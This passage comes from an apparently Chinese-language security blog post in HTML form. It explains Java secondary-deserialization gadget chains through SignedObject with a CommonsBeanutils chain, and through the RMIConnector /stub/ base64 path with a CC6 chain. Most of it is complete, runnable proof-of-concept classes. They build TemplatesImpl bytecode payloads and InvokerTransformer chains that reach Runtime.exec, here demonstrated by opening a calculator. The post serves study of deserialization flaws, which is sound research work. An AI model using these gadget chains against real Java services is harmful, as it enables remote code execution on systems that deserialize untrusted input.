map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, payloadObj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, payloadObj);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, clazz);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_obj&quot;</span>, payloadObj);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="无cc依赖的cb"><a class="markdownIt-Anchor" href="#无cc依赖的cb"></a> 无CC依赖的CB</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(org.example.Base.Eval.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue1</span> <span class="operator">=</span> getPayload(obj, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(queue1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue2</span> <span class="operator">=</span> getPayload(signedObject, <span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data=serialize(queue2);</span><br><span class="line">        unserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue <span class="title function_">getPayload</span> <span class="params">(Object object, String string)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, string);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object, object&#125;);</span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="rmiconnector"><a class="markdownIt-Anchor" href="#rmiconnector"></a> RMIConnector</h2>
+<p>找到<code>RMIConnector#findRMIServerJRMP()</code>，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="type">boolean</span> isIiop)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] serialized;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serialized = base64ToByteArray(base64);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                    e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span></span><br><span class="line">                (loader == <span class="literal">null</span>) ?</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin) :</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ObjectInputStreamWithLoader</span>(bin, loader);</span><br><span class="line">        <span class="keyword">final</span> Object stub;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = oin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先Base64解码，包装成数组，然后反序列化，满足条件，往上看调用 findRMIServer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span><br><span class="line"><span class="params">            Map&lt;String, Object&gt; environment)</span></span><br><span class="line">            <span class="keyword">throws</span> NamingException, IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isIiop</span> <span class="operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">            <span class="comment">// Make sure java.naming.corba.orb is in the Map.</span></span><br><span class="line">            environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> directoryURL.getURLPath();</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/ior/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;iiop protocol not available&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>,end), environment, isIiop);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;or /ior/: &quot;</span> + path;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>匹配 /stub/，如果可以匹配到就反序列化 / 后面的base64数据，往上看什么调用了 findRMIServer，找到</p>
+<p>两个</p>
+<p><img src="../images/4-17617048414444.png" alt="img" /></p>
+<p><img src="../images/5-17617048465437.png" alt="img" /></p>
+<p>但是 doStart 是 protected 修饰的，所以只能想着调用 connnect，但是这个玩意非常难调，所以这个二次反序列化<strong>基本只能用于CC链</strong>，可以直接用 InvokerTransformer 去调用</p>
+<p>其实就是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RMIConnector.connect()</span><br><span class="line"> </span><br><span class="line">RMIConnector.findRMIServer()</span><br><span class="line"> </span><br><span class="line">RMIConnector.findRMIServerJRMP()<span class="comment">//RMIConnector.findRMIServer()支持jndi，stub，ior这三个服务,理论上三者应该都能打</span></span><br><span class="line">然后就是进行序列化和反序列化</span><br></pre></td></tr></table></figure>
+<p>以CC6为例子，poc 如下</p>
+<h3 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIConnectorPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformersField</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        transformersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformersField.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> serialize2Base64(map2);</span><br><span class="line">        run(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] ser)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Unserialize Ok!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize2Base64</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialize Ok!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String base64)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建恶意的RMIConnector  </span></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+base64);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">fakeConnect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, fakeConnect);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line">		<span class="comment">//使用InvokerTransformer 调用 connect 方法  </span></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap1);</span><br><span class="line">        unserialize(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
